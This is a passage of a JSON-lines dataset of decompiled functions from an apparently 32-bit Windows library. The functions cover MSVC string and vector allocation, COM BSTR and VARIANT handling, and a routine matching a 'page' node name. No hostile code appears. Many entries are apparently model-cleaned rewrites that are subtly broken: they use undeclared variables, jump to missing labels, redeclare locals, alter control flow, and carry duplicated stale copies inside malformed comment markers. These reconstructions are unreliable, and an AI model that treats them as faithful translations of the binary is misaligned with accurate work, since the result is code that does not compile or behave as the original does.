0x24) = 0;\nFUN_100034c0(param_1,param_2,uVar2,piVar8,param_6,iVar14);\nif (0xf < local_34) {\npppppuVar12 = local_48[0];\nif ((0xfff < local_34 + 1) &&\n(pppppuVar12 = (undefined4 *****)local_48[0][-1],\n(char *)0x1f < (char *)((int)local_48[0] + (-4 - (int)pppppuVar12)))) {\nLAB_10003f3f:\nFUN_1001dea6();\ngoto LAB_10003f44;\n}\nFUN_10013ceb(pppppuVar12);\n}\nlocal_38 = 0;\nlocal_34 = 0xf;\nlocal_48[0] = (undefined4 *****)((uint)local_48[0] & 0xffffff00);\nif ((int *)0xf < local_1c) {\npppppuVar12 = local_30[0];\nif ((0xfff < (int)local_1c + 1U) &&\n(pppppuVar12 = (undefined4 *****)local_30[0][-1],\n(byte *)0x1f < (byte *)((int)local_30[0] + (-4 - (int)pppppuVar12)))) {\nLAB_10003f44:\nFUN_1001dea6();\npcVar3 = (code *)swi(3);\n(*pcVar3)();\nreturn;\n}\nFUN_10013ceb(pppppuVar12);\n}\nExceptionList = local_10;\n___security_check_cookie_4(local_14 ^ (uint)&stack0xfffffffc);\nreturn;\n}\nLocal Variable: local_8 : undefined4\nLocal Variable: local_10 : undefined4\nLocal Variable: local_14 : undefined4\nLocal Variable: local_18 : undefined2\nLocal Variable: local_1c : undefined4\nLocal Variable: local_20 : undefined4\nLocal Variable: local_30 : undefined4\nLocal Variable: local_34 : undefined4\nLocal Variable: local_38 : undefined4\nLocal Variable: local_48 : undefined4\nLocal Variable: local_49 : undefined1\nLocal Variable: local_50 : undefined4\nLocal Variable: local_54 : undefined4\nLocal Variable: local_58 : undefined1\nLocal Variable: local_5c : undefined4\nLocal Variable: local_60 : undefined4\nLocal Variable: local_64 : undefined4\nLocal Variable: local_68 : undefined4\nLocal Variable: local_6c : undefined4\nLocal Variable: local_70 : undefined1\nLocal Variable: local_74 : undefined4"}
{"Function Name": "FUN_10004150", "Address": "10004150", "Source Code": "void ** __thiscall FUN_10004150(void *context, void **parameters)\n{\n    void *valuePointer; \n    code *functionPointer; \n    \n    if ((void **)context != parameters) {\n        \n        if (0xf < *(uint *)((int)context + 0x14)) {\n            valuePointer = *context; \n            \n            \n            if (0xfff < *(uint *)((int)context + 0x14) + 1 && \n                0x1f < (uint)((int)valuePointer + (-4 - *(void **)((int)valuePointer - 4)))) {\n                FUN_1001dea6(); \n                functionPointer = (code *)swi(3); \n                return (void **)(*functionPointer)(); \n            }\n            FUN_10013ceb(*(void **)((int)context + 4)); \n        }\n        \n        *(undefined4 *)((int)context + 0x10) = 0; \n        *(undefined4 *)((int)context + 0x14) = 0xf; \n        *(undefined *)context = 0; \n        *(void **)context = *parameters; \n        *(void **)((int)context + 4) = parameters[1]; \n        *(void **)((int)context + 8) = parameters[2]; \n        *(void **)((int)context + 0xc) = parameters[3]; \n        *(undefined8 *)((int)context + 0x10) = *(undefined8 *)(parameters + 4); \n        parameters[4] = (void *)0x0; \n        parameters[5] = (void *)0xf; \n        *(undefined *)parameters = 0; \n    }\n    return (void **)context; \n}"}
{"Function Name": "FUN_100041d0", "Address": "100041d0", "Source Code": "void __fastcall FUN_100041d0(int *param_1)\n{\n    uint securityCookieValue; \n    int *localDataPointer; \n    securityCookieValue = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    ExceptionList = &ExceptionList; \n    \n    \n    if (*(int *)(*(int *)(*param_1 + 4) + 0x38 + (int)param_1) != 0) {\n        FUN_10002990(&localDataPointer, param_1); \n        \n        \n        if (local_18 != '\\0') {\n            \n            int functionResult = (**(code **)(**(int **)(*(int *)(*param_1 + 4) + 0x38 + (int)param_1) + 0x34))(securityCookieValue);\n            \n            if (functionResult == -1) {\n                FUN_10002180((void *)(*(int *)(*param_1 + 4) + (int)param_1),\n                *(uint *)(*(int *)(*param_1 + 4) + 0xc + (int)param_1) | 4, '\\0');\n            }\n        }\n        \n        \n        if (!___uncaught_exception()) {\n            FUN_100042a0(localDataPointer); \n        }\n        \n        \n        int *functionPointer = *(int **)(*(int *)(*localDataPointer + 4) + 0x38 + (int)localDataPointer);\n        \n        if (functionPointer != (int *)0x0) {\n            (**(code **)(*functionPointer + 8))(); \n        }\n    }\n    \n    ExceptionList = &ExceptionList; \n    ___security_check_cookie_4(securityCookieValue ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "FUN_100042a0", "Address": "100042a0", "Source Code": "void __fastcall FUN_100042a0(int *inputPointer)\n{\n    int value; \n    void *previousExceptionList; \n    previousExceptionList = currentExceptionList; \n    currentExceptionList = &previousExceptionList; \n    value = *(int *)(*inputPointer + 4); \n    \n    if ((*(int *)(value + 0xc + (int)inputPointer) == 0) &&\n        ((*(byte *)(value + 0x14 + (int)inputPointer) & 2) != 0)) {\n        \n        \n        value = (**(code **)(**(int **)(value + 0x38 + (int)inputPointer) + 0x34))();\n        \n        \n        if (value == -1) {\n            FUN_10002180((void *)(*(int *)(*inputPointer + 4) + (int)inputPointer),\n            *(uint *)(*(int *)(*inputPointer + 4) + 0xc + (int)inputPointer) | 4, '\\0');\n        }\n    }\n    \n    currentExceptionList = previousExceptionList; \n    return; \n}"}
{"Function Name": "FUN_10004380", "Address": "10004380", "Source Code": "void __fastcall FUN_10004380(int input_parameter)\n{\n    \n    FUN_1001dc78(*(void **)(input_parameter + 8));\n    \n    \n    FUN_1001dc78(*(void **)(input_parameter + 0x10));\n    \n    \n    FUN_1001dc78(*(void **)(input_parameter + 0x14));\n}"}
{"Function Name": "FUN_100048b0", "Address": "100048b0", "Source Code": "void * __thiscall FUN_100048b0(void *context, undefined8 *input_param, undefined4 *output_param)\n{\n    int base_value = *context; \n    int allocated_size = (*(int *)((int)context + 4) - base_value) >> 2; \n    if (allocated_size == 0x3fffffff) goto LAB_10004a1c; \n    uint incremented_value = allocated_size + 1; \n    uint second_calculated_value = (*(int *)((int)context + 8) - base_value) >> 2; \n    uint adjusted_value = incremented_value; \n    \n    if ((second_calculated_value <= 0x3fffffff - (second_calculated_value >> 1)) && (adjusted_value = (second_calculated_value >> 1) + second_calculated_value, adjusted_value < incremented_value)) {\n        adjusted_value = incremented_value; \n    }\n    uint threshold_value; \n    uint scaled_value = adjusted_value * 4; \n    \n    if (adjusted_value < 0x40000000) {\n        if (scaled_value == 0) {\n            return (void *)(*context + ((int)input_param - base_value >> 2) * 4); \n        } else {\n            undefined8 *allocated_memory = (undefined8 *)FUN_10013cf9(scaled_value); \n            *(undefined4 *)(((int)input_param - base_value >> 2) * 4 + (int)allocated_memory) = *output_param; \n            void *context_value = *context; \n            FUN_10005670(); \n            \n            if (input_param == (undefined8 *)0) {\n                FUN_10018bf0(allocated_memory, context_value, (int)input_param - (int)context_value);\n            } else {\n                FUN_10018bf0(allocated_memory, context_value, (int)input_param - (int)context_value);\n                FUN_10005670(); \n                FUN_10018bf0((undefined8 *)0, input_param, *(int *)((int)context + 4) - (int)input_param); \n            }\n            \n            if (context_value == (void *)0x0) {\n                *(undefined8 **)context = allocated_memory; \n                *(uint *)((int)context + 4) = (int)allocated_memory + incremented_value * 4; \n                *(uint *)((int)context + 8) = scaled_value + (int)allocated_memory; \n                return (void *)(*context + ((int)input_param - base_value >> 2) * 4); \n            }\n            \n            if ((*(int *)((int)context + 8) - (int)context_value & 0xfffffffcU) < 0x1000 || \n                (uint)((int)context_value + (-4 - (int)*(void **)((int)context_value + -4))) < 0x20) {\n                FUN_10013ceb(*(void **)((int)context_value + -4)); \n                *(undefined8 **)context = allocated_memory; \n                *(uint *)((int)context + 4) = (int)allocated_memory + incremented_value * 4; \n                *(uint *)((int)context + 8) = scaled_value + (int)allocated_memory; \n                return (void *)(*context + ((int)input_param - base_value >> 2) * 4); \n            }\n        }\n    } else {\n        adjusted_value = 0xffffffff; \n        threshold_value = adjusted_value + 0x23; \n        if (threshold_value <= adjusted_value) {\n            threshold_value = 0xffffffff; \n        }\n        int allocated_size = FUN_10013cf9(threshold_value); \n        if (allocated_size != 0) {\n            undefined8 *allocated_memory = (undefined8 *)(allocated_size + 0x23U & 0xffffffe0); \n            *(int *)((int)allocated_memory - 4) = allocated_size; \n            goto LAB_1000495e; \n        }\n    }\n    FUN_1001dea6(); \nLAB_10004a1c:\n    FUN_10005250(); \n    return (void *)(*(code *)swi(3))(); \n}"}
{"Function Name": "FUN_10004ff0", "Address": "10004ff0", "Source Code": "uint __cdecl FUN_10004ff0(uint inputValue)\n{\n    uint adjustedValue;\n    \n    if (inputValue < 0x1000) {\n        \n        if (inputValue != 0) {\n            return FUN_10013cf9(inputValue);\n        }\n        \n        return 0;\n    }\n    \n    \n    adjustedValue = inputValue + 0x23;\n    \n    \n    if (adjustedValue <= inputValue) {\n        return 0xffffffff;\n    }\n    \n    \n    int resultValue = FUN_10013cf9(adjustedValue);\n    \n    \n    if (resultValue != 0) {\n        adjustedValue = resultValue + 0x23U & 0xffffffe0; \n        *(int *)(adjustedValue - 4) = resultValue; \n        return adjustedValue; \n    }\n    \n    \n    return FUN_1001dea6();\n}"}
{"Function Name": "FUN_10005040", "Address": "10005040", "Source Code": "void FUN_10005040(void *input_pointer, uint threshold)\n{\n    void *previous_value = input_pointer; \n    \n    if ((0xfff < threshold) && (previous_value = *(void **)((int)input_pointer - 4), 0x1f < (uint)((int)input_pointer - (4 + (int)previous_value)))) {\n        FUN_1001dea6(); \n        return; \n    }\n    FUN_10013ceb(previous_value); \n}"}
{"Function Name": "FUN_10005080", "Address": "10005080", "Source Code": "\\*\nundefined8 * __thiscall\nFUN_10005080(void *this, uint param_1, undefined4 param_2, uint param_3, size_t param_4, char param_5)\n{\n    void *_Dst; \n    int iVar1 = *(int *)((int)this + 0x10); \n    \n    if (0x7fffffffU - iVar1 < param_1) {\n        FUN_10005260(); \n    } else {\n        uint uVar2 = *(uint *)((int)this + 0x14); \n        uint uVar8 = iVar1 + param_1 | 0xf; \n        \n        if (uVar8 < 0x80000000) {\n            \n            if (0x7fffffff - (uVar2 >> 1) < uVar2) {\n                uVar8 = 0x7fffffff; \n            } else {\n                uint uVar7 = (uVar2 >> 1) + uVar2; \n                if (uVar8 < uVar7) {\n                    uVar8 = uVar7; \n                }\n            }\n        } else {\n            uVar8 = 0x7fffffff; \n        }\n        uint uVar7 = -(uint)(0xfffffffe < uVar8) | uVar8 + 1; \n        undefined8 *puVar10; \n        \n        if (uVar7 < 0x1000) {\n            puVar10 = (uVar7 == 0) ? (undefined8 *)0x0 : (undefined8 *)FUN_10013cf9(uVar7); \n        } else {\n            uint uVar5 = uVar7 + 0x23; \n            if (uVar5 <= uVar7) {\n                uVar5 = 0xffffffff; \n            }\n            int iVar6 = FUN_10013cf9(uVar5); \n            if (iVar6 == 0) goto LAB_100051f0; \n            puVar10 = (undefined8 *)(iVar6 + 0x23U & 0xffffffe0); \n            *(int *)((int)puVar10 - 4) = iVar6; \n        }\n        \n        *(uint *)((int)this + 0x10) = iVar1 + param_1; \n        uVar7 = (iVar1 - param_3) + 1; \n        *(uint *)((int)this + 0x14) = uVar8; \n        _Dst = (void *)((int)puVar10 + param_3); \n        \n        if (uVar2 < 0x10) {\n            FUN_10018670(puVar10, (undefined8 *)this, param_3); \n            _memset(_Dst, (int)param_5, param_4); \n            FUN_10018670((undefined8 *)(param_4 + (int)_Dst), (undefined8 *)(param_3 + (int)this), uVar7); \n            *(undefined8 **)this = puVar10; \n            return (undefined8 *)this; \n        }\n        \n        undefined8 *puVar3 = *this; \n        FUN_10018670(puVar10, puVar3, param_3); \n        _memset(_Dst, (int)param_5, param_4); \n        FUN_10018670((undefined8 *)(param_4 + (int)_Dst), (undefined8 *)(param_3 + (int)puVar3), uVar7); \n        \n        if ((uVar2 + 1 < 0x1000) || ((uint)((int)puVar3 + (-4 - *(undefined8 **)((int)puVar3 - 4))) < 0x20)) {\n            FUN_10013ceb(*(undefined8 **)((int)puVar3 - 4)); \n            *(undefined8 **)this = puVar10; \n            return (undefined8 *)this; \n        }\n    }\nLAB_100051f0:\n    FUN_1001dea6(); \n    code *pcVar4 = (code *)swi(3); \n    return (undefined8 *)(*pcVar4)(); \n}\n*\\ \n \nundefined8 * __thiscall\nFUN_10005080(void *this, uint param_1, undefined4 param_2, uint param_3, size_t param_4, char param_5)\n{\n    void *_Dst;\n    int iVar1 = *(int *)((int)this + 0x10);\n    if (0x7fffffffU - iVar1 < param_1) {\n        FUN_10005260();\n    } else {\n        uint uVar2 = *(uint *)((int)this + 0x14);\n        uint uVar8 = iVar1 + param_1 | 0xf;\n        if (uVar8 < 0x80000000) {\n            if (0x7fffffff - (uVar2 >> 1) < uVar2) {\n                uVar8 = 0x7fffffff;\n            } else {\n                uint uVar7 = (uVar2 >> 1) + uVar2;\n                if (uVar8 < uVar7) {\n                    uVar8 = uVar7;\n                }\n            }\n        } else {\n            uVar8 = 0x7fffffff;\n        }\n        uint uVar7 = -(uint)(0xfffffffe < uVar8) | uVar8 + 1;\n        undefined8 *puVar10;\n        if (uVar7 < 0x1000) {\n            puVar10 = (uVar7 == 0) ? (undefined8 *)0x0 : (undefined8 *)FUN_10013cf9(uVar7);\n        } else {\n            uint uVar5 = uVar7 + 0x23;\n            if (uVar5 <= uVar7) {\n                uVar5 = 0xffffffff;\n            }\n            int iVar6 = FUN_10013cf9(uVar5);\n            if (iVar6 == 0) goto LAB_100051f0;\n            puVar10 = (undefined8 *)(iVar6 + 0x23U & 0xffffffe0);\n            *(int *)((int)puVar10 - 4) = iVar6;\n        }\n        *(uint *)((int)this + 0x10) = iVar1 + param_1;\n        uVar7 = (iVar1 - param_3) + 1;\n        *(uint *)((int)this + 0x14) = uVar8;\n        _Dst = (void *)((int)puVar10 + param_3);\n        if (uVar2 < 0x10) {\n            FUN_10018670(puVar10, (undefined8 *)this, param_3);\n            _memset(_Dst, (int)param_5, param_4);\n            FUN_10018670((undefined8 *)(param_4 + (int)_Dst), (undefined8 *)(param_3 + (int)this), uVar7);\n            *(undefined8 **)this = puVar10;\n            return (undefined8 *)this;\n        }\n        undefined8 *puVar3 = *this;\n        FUN_10018670(puVar10, puVar3, param_3);\n        _memset(_Dst, (int)param_5, param_4);\n        FUN_10018670((undefined8 *)(param_4 + (int)_Dst), (undefined8 *)(param_3 + (int)puVar3), uVar7);\n        if ((uVar2 + 1 < 0x1000) || ((uint)((int)puVar3 + (-4 - *(undefined8 **)((int)puVar3 - 4))) < 0x20)) {\n            FUN_10013ceb(*(undefined8 **)((int)puVar3 - 4));\n            *(undefined8 **)this = puVar10;\n            return (undefined8 *)this;\n        }\n    }\nLAB_100051f0:\n    FUN_1001dea6();\n    code *pcVar4 = (code *)swi(3);\n    return (undefined8 *)(*pcVar4)();\n}"}
{"Function Name": "FUN_10005200", "Address": "10005200", "Source Code": "\\*\nundefined4 * __thiscall FUN_10005200(void *object, int source_param)\n{\n    \n    *(undefined ***)object = std::exception::vftable;\n    \n    *(undefined8 *)((int)object + 4) = 0;\n    \n    ___std_exception_copy((char **)(source_param + 4), (char **)((int)object + 4));\n    \n    *(undefined ***)object = std::bad_cast::vftable;\n    \n    return (undefined4 *)object;\n}\n*\\ \n \nundefined4 * __thiscall FUN_10005200(void *object,int source_param)\n{\n    *(undefined ***)object = std::exception::vftable;\n    *(undefined8 *)((int)object + 4) = 0;\n    ___std_exception_copy((char **)(source_param + 4),(char **)((int)object + 4));\n    *(undefined ***)object = std::bad_cast::vftable;\n    return (undefined4 *)object;\n}"}
{"Function Name": "FUN_10005650", "Address": "10005650", "Source Code": "undefined4 FUN_10005650(undefined4 input_value, undefined4 *output_array)\n{\n    \n    output_array[0] = std::_Iostream_error_category::vftable;\n    \n    \n    output_array[1] = 5;\n    \n    \n    return 1;\n}"}
{"Function Name": "FUN_100061d0", "Address": "100061d0", "Source Code": "undefined4 __fastcall FUN_100061d0(int inputValue, undefined4 newValue)\n{\n    undefined4 *envEntry; \n    if (inputValue != 0) { \n        \n        for (envEntry = *(undefined4 **)(*(int *)((int)environmentBlock + 0xc) + 0x14);\n             envEntry != (undefined4 *)(*(int *)((int)environmentBlock + 0xc) + 0x14);\n             envEntry = (undefined4 *)*envEntry) {\n             \n            \n            if (envEntry[4] == inputValue) {\n                envEntry[4] = newValue; \n                return 1; \n            }\n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_10007bd0", "Address": "10007bd0", "Source Code": "void __cdecl FUN_10007bd0(undefined4 first_argument, wchar_t *second_argument)\n{\n    \n    \n    \n    \n    \n    FUN_10007ba0(first_argument, second_argument, first_argument, &stack_variable);\n}"}
{"Function Name": "FUN_10007c10", "Address": "10007c10", "Source Code": "\\*\nundefined4 * __thiscall FUN_10007c10(void *objectPointer, undefined4 valueToStore)\n{\n    \n    return *(undefined4 **)objectPointer = valueToStore, \n           (undefined4 *)objectPointer; \n}\n*\\ \n \nundefined4 * __thiscall FUN_10007c10(void *objectPointer, undefined4 valueToStore)\n{\n    return *(undefined4 **)objectPointer = valueToStore, (undefined4 *)objectPointer;\n}"}
{"Function Name": "FUN_10007d40", "Address": "10007d40", "Source Code": "\\*\nundefined4 * __thiscall FUN_10007d40(void *contextPointer, LPCSTR inputString)\n{\n    undefined8 *allocatedMemoryPointer; \n    undefined4 convertedStringValue;   \n    allocatedMemoryPointer = (undefined8 *)FUN_10013cf9(0xc); \n    if (allocatedMemoryPointer != (undefined8 *)0x0) { \n        *allocatedMemoryPointer = 0; \n        *(undefined4 *)(allocatedMemoryPointer + 1) = 1; \n        convertedStringValue = ConvertStringToBSTR(inputString); \n        *(undefined4 *)allocatedMemoryPointer = convertedStringValue; \n        *(undefined8 **)contextPointer = allocatedMemoryPointer; \n        return (undefined4 *)contextPointer; \n    }\n    _com_issue_error(-0x7ff8fff2); \n    return (undefined4 *)(*(code *)swi(3))(); \n}\n*\\ \n \nundefined4 * __thiscall FUN_10007d40(void *contextPointer, LPCSTR inputString)\n{\n    undefined8 *allocatedMemoryPointer;\n    undefined4 convertedStringValue;\n    allocatedMemoryPointer = (undefined8 *)FUN_10013cf9(0xc);\n    if (allocatedMemoryPointer != (undefined8 *)0x0) {\n        *allocatedMemoryPointer = 0;\n        *(undefined4 *)(allocatedMemoryPointer + 1) = 1;\n        convertedStringValue = ConvertStringToBSTR(inputString);\n        *(undefined4 *)allocatedMemoryPointer = convertedStringValue;\n        *(undefined8 **)contextPointer = allocatedMemoryPointer;\n        return (undefined4 *)contextPointer;\n    }\n    _com_issue_error(-0x7ff8fff2);\n    return (undefined4 *)(*(code *)swi(3))();\n}"}
{"Function Name": "FUN_10007de0", "Address": "10007de0", "Source Code": "\\*\nundefined4 * __thiscall FUN_10007de0(void *context, OLECHAR *oleCharParam)\n{\n    code *functionPointer; \n    undefined8 *allocatedMemory; \n    BSTR bstrString; \n    allocatedMemory = (undefined8 *)FUN_10013cf9(0xc); \n    if (allocatedMemory != (undefined8 *)0x0) { \n        *allocatedMemory = 0; \n        *(undefined4 *)(allocatedMemory + 1) = 1; \n        bstrString = SysAllocString(oleCharParam); \n        *(BSTR *)allocatedMemory = bstrString; \n        if ((bstrString == (BSTR)0x0) && (oleCharParam != (OLECHAR *)0x0)) { \n            _com_issue_error(-0x7ff8fff2); \n        }\n    }\n    *(undefined8 **)context = allocatedMemory; \n    if (allocatedMemory != (undefined8 *)0x0) { \n        return (undefined4 *)context; \n    }\n    _com_issue_error(-0x7ff8fff2); \n    functionPointer = (code *)swi(3); \n    return (undefined4 *)(*functionPointer)(); \n}\n*\\ \n \nundefined4 * __thiscall FUN_10007de0(void *context, OLECHAR *oleCharParam)\n{\n    code *functionPointer;\n    undefined8 *allocatedMemory;\n    BSTR bstrString;\n    allocatedMemory = (undefined8 *)FUN_10013cf9(0xc);\n    if (allocatedMemory != (undefined8 *)0x0) {\n        *allocatedMemory = 0;\n        *(undefined4 *)(allocatedMemory + 1) = 1;\n        bstrString = SysAllocString(oleCharParam);\n        *(BSTR *)allocatedMemory = bstrString;\n        if ((bstrString == (BSTR)0x0) && (oleCharParam != (OLECHAR *)0x0)) {\n            _com_issue_error(-0x7ff8fff2);\n        }\n    }\n    *(undefined8 **)context = allocatedMemory;\n    if (allocatedMemory != (undefined8 *)0x0) {\n        return (undefined4 *)context;\n    }\n    _com_issue_error(-0x7ff8fff2);\n    functionPointer = (code *)swi(3);\n    return (undefined4 *)(*functionPointer)();\n}"}
{"Function Name": "FUN_10007e90", "Address": "10007e90", "Source Code": "void __fastcall FUN_10007e90(undefined4 *inputArray)\n{\n    \n    BSTR *bstrPointer = (BSTR *)*inputArray;\n    \n    if (bstrPointer != (BSTR *)0x0) {\n        LOCK(); \n        \n        BSTR referenceCount = *(bstrPointer + 2);\n        \n        \n        *(bstrPointer + 2) = (BSTR)((int)*(bstrPointer + 2) - 1);\n        \n        UNLOCK(); \n        \n        if (referenceCount == (BSTR)0x1) {\n            \n            if (*bstrPointer != (BSTR)0x0) {\n                \n                SysFreeString(*bstrPointer);\n                *bstrPointer = (BSTR)0x0; \n            }\n            \n            if (bstrPointer[1] != (BSTR)0x0) {\n                \n                thunk_FUN_1001dc78(bstrPointer[1]);\n                bstrPointer[1] = (BSTR)0x0; \n            }\n            \n            FUN_10013ceb(bstrPointer);\n        }\n        \n        *inputArray = 0;\n    }\n}"}
{"Function Name": "FUN_10007ef0", "Address": "10007ef0", "Source Code": "int ** __thiscall FUN_10007ef0(void *contextPtr, OLECHAR *inputParam)\n{\n    BSTR *bstrArrayPtr; \n    OLECHAR *oleCharPtr; \n    undefined8 *undefinedPtr; \n    BSTR bstrVar; \n    int **intPtrResult; \n    \n    if (inputParam != (OLECHAR *)0x0) {\n        \n        if (*contextPtr == (OLECHAR **)0x0) {\n            oleCharPtr = (OLECHAR *)0x0; \n        } else {\n            oleCharPtr = **contextPtr; \n        }\n        \n        if (oleCharPtr == inputParam) {\n            return (int **)contextPtr;\n        }\n    }\n    bstrArrayPtr = *contextPtr; \n    \n    if (bstrArrayPtr != (BSTR *)0x0) {\n        LOCK(); \n        BSTR *refCountPtr = bstrArrayPtr + 2; \n        bstrVar = *refCountPtr; \n        *refCountPtr = (BSTR)((int)*refCountPtr + -1); \n        UNLOCK(); \n        \n        if ((bstrVar == (BSTR)0x1) && (bstrArrayPtr != (BSTR *)0x0)) {\n            \n            if (*bstrArrayPtr != (BSTR)0x0) {\n                SysFreeString(*bstrArrayPtr);\n                *bstrArrayPtr = (BSTR)0x0; \n            }\n            \n            if (bstrArrayPtr[1] != (BSTR)0x0) {\n                thunk_FUN_1001dc78(bstrArrayPtr[1]);\n                bstrArrayPtr[1] = (BSTR)0x0;\n            }\n            FUN_10013ceb(bstrArrayPtr); \n        }\n        *(undefined4 *)contextPtr = 0; \n    }\n    undefinedPtr = (undefined8 *)FUN_10013cf9(0xc); \n    \n    if (undefinedPtr != (undefined8 *)0x0) {\n        *undefinedPtr = 0; \n        *(undefined4 *)(undefinedPtr + 1) = 1; \n        bstrVar = SysAllocString(inputParam); \n        *(BSTR *)undefinedPtr = bstrVar; \n        \n        if ((bstrVar == (BSTR)0x0) && (inputParam != (OLECHAR *)0x0)) {\n            _com_issue_error(-0x7ff8fff2); \n            goto LAB_10007ffa; \n        }\n    }\n    *(undefined8 **)contextPtr = undefinedPtr; \n    \n    if (undefinedPtr != (undefined8 *)0x0) {\n        return (int **)contextPtr;\n    }\nLAB_10007ffa:\n    _com_issue_error(-0x7ff8fff2); \n    code *pcVar3 = (code *)swi(3); \n    intPtrResult = (int **)(*pcVar3)(); \n    return intPtrResult; \n}"}
{"Function Name": "FUN_10008140", "Address": "10008140", "Source Code": "\\*\nVARIANTARG * __thiscall FUN_10008140(void *variantPointer, VARIANTARG *sourceVariant)\n{\n    HRESULT resultCode; \n    VariantInit((VARIANTARG *)variantPointer); \n    resultCode = VariantCopy((VARIANTARG *)variantPointer, sourceVariant); \n    if (resultCode >= 0) { \n        return (VARIANTARG *)variantPointer; \n    }\n    _com_issue_error(resultCode); \n    return (VARIANTARG *)(*(code *)swi(3))(); \n}\n*\\ \n \nVARIANTARG * __thiscall FUN_10008140(void *variantPointer, VARIANTARG *sourceVariant)\n{\n    HRESULT resultCode;\n    VariantInit((VARIANTARG *)variantPointer);\n    resultCode = VariantCopy((VARIANTARG *)variantPointer, sourceVariant);\n    if (resultCode >= 0) {\n        return (VARIANTARG *)variantPointer;\n    }\n    _com_issue_error(resultCode);\n    return (VARIANTARG *)(*(code *)swi(3))();\n}"}
{"Function Name": "FUN_100089d0", "Address": "100089d0", "Source Code": "void __fastcall FUN_100089d0(int **inputPointer, void *context)\n{\n    int *intPointer; \n    code *functionPointer; \n    char charResult; \n    int resultCode; \n    BSTR wideString; \n    int conversionResult; \n    HRESULT comparisonResult; \n    BSTR unusedBSTR; \n    uint localValue; \n    void *exceptionListPointer; \n    undefined4 localStatus; \n    exceptionListPointer = ExceptionList; \n    localValue = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    ExceptionList = &exceptionListPointer; \n    intPointer = *inputPointer; \n    if (intPointer == (int *)0x0) { \n        _com_issue_error(-0x7fffbffd); \n        SysFreeString(unusedBSTR); \n        FUN_10007c20(0x8007000e); \n        functionPointer = (code *)swi(3); \n        (*functionPointer)(); \n        return; \n    }\n    localStatus = 0; \n    int *localIntPointer = (int *)0x0; \n    (**(code **)(*intPointer + 0x34))(intPointer, &localIntPointer, localValue); \n    unusedBSTR = (BSTR)SysFreeString_exref; \n    if (localIntPointer == (int *)0x0) { \n        localStatus = 0xc; \n        ExceptionList = exceptionListPointer; \n        return; \n    }\n    BSTR localBSTR = (BSTR)0x0; \n    localStatus._0_1_ = 2; \n    resultCode = (**(code **)(*localIntPointer + 0x1c))(localIntPointer, &localBSTR); \n    if (resultCode < 0) { \n        (*(code *)unusedBSTR)(localBSTR); \n        localStatus = 0xc; \n        ExceptionList = exceptionListPointer; \n        return; \n    }\n    int resultCode = MultiByteToWideChar(3, 0, \"page\", -1, (LPWSTR)0x0, 0); \n    wideString = SysAllocStringLen((OLECHAR *)0x0, resultCode - 1); \n    if (wideString == (BSTR)0x0) { \n        SysFreeString(localBSTR); \n        ExceptionList = exceptionListPointer; \n        return; \n    }\n    conversionResult = MultiByteToWideChar(3, 0, \"page\", -1, wideString, resultCode); \n    unusedBSTR = wideString; \n    if (conversionResult != resultCode) { \n        SysFreeString(localBSTR); \n        SysFreeString(wideString); \n        ExceptionList = exceptionListPointer; \n        return; \n    }\n    comparisonResult = VarBstrCmp(localBSTR, wideString, 0x400, 0); \n    SysFreeString(wideString); \n    if (comparisonResult == 1) { \n        undefined localBuffer[16]; \n        localStatus._0_1_ = 4; \n        charResult = FUN_10008c20(&localIntPointer, (int *)localBuffer); \n        if (charResult != '\\0') { \n            intPointer = *(int **)((int)context + 4); \n            if (*(int **)((int)context + 8) == intPointer) { \n                FUN_1000bb50(context, intPointer, (undefined4 *)localBuffer); \n            } else {\n                *intPointer = localBuffer._0_4_; \n                FUN_1000c310(intPointer + 1, (int *)(localBuffer + 4)); \n                *(int *)((int)context + 4) += 0x10; \n            }\n        }\n        FUN_1000b580((int *)(localBuffer + 4)); \n    }\n    int *anotherIntPointer = (int *)0x0; \n    localStatus._0_1_ = 5; \n    resultCode = (**(code **)(*localIntPointer + 0x40))(localIntPointer, &anotherIntPointer); \n    if (resultCode < 0) { \n        localStatus._0_1_ = 7; \n        if (anotherIntPointer != (int *)0x0) { \n            (**(code **)(*anotherIntPointer + 8))(anotherIntPointer); \n        }\n        SysFreeString(localBSTR); \n        ExceptionList = exceptionListPointer; \n        return; \n    }\n    if (localIntPointer != anotherIntPointer) { \n        localIntPointer = anotherIntPointer; \n        localStatus._0_1_ = 10; \n        if (anotherIntPointer != (int *)0x0) { \n            (**(code **)(*anotherIntPointer + 4))(anotherIntPointer); \n        }\n        localStatus._0_1_ = 9; \n        if (intPointer != (int *)0x0) { \n            (**(code **)(*intPointer + 8))(intPointer); \n        }\n    }\n    localStatus = CONCAT31(localStatus._1_3_, 0xb); \n    if (anotherIntPointer != (int *)0x0) { \n        (**(code **)(*anotherIntPointer + 8))(anotherIntPointer); \n    }\n    SysFreeString(localBSTR); \n}"}
{"Function Name": "FUN_10009410", "Address": "10009410", "Source Code": "void __fastcall FUN_10009410(void **inputArray)\n{\n    void *firstElement; \n    code *functionPointer; \n    FUN_1000b610((int *)(inputArray + 10)); \n    if ((void *)0x7 < inputArray[5]) { \n        firstElement = *inputArray; \n        if ((0xfff < (int)inputArray[5] * 2 + 2U) && \n            (*(void **)((int)firstElement - 4), 0x1f < (uint)((int)firstElement - 4 - (int)*(void **)((int)firstElement - 4)))) { \n            FUN_1001dea6(); \n            functionPointer = (code *)swi(3); \n            (*functionPointer)(); \n            return; \n        }\n        FUN_10013ceb(*(void **)((int)firstElement - 4)); \n    }\n    inputArray[4] = (void *)0x0; \n    inputArray[5] = (void *)0x7; \n    *(undefined2 *)inputArray = 0; \n    return; \n}"}
{"Function Name": "FUN_1000b3f0", "Address": "1000b3f0", "Source Code": "int ** __fastcall FUN_1000b3f0(int **inputPointer)\n{\n    int *integerPointer; \n    void *previousExceptionList; \n    previousExceptionList = currentExceptionList; \n    currentExceptionList = &previousExceptionList; \n    integerPointer = *inputPointer; \n    if (integerPointer != (int *)0x0) { \n        (**(code **)(*integerPointer + 8))(integerPointer, DAT_1004e008 ^ (uint)&stackOffset); \n    }\n    *inputPointer = (int *)0x0; \n    currentExceptionList = previousExceptionList; \n    return inputPointer; \n}"}
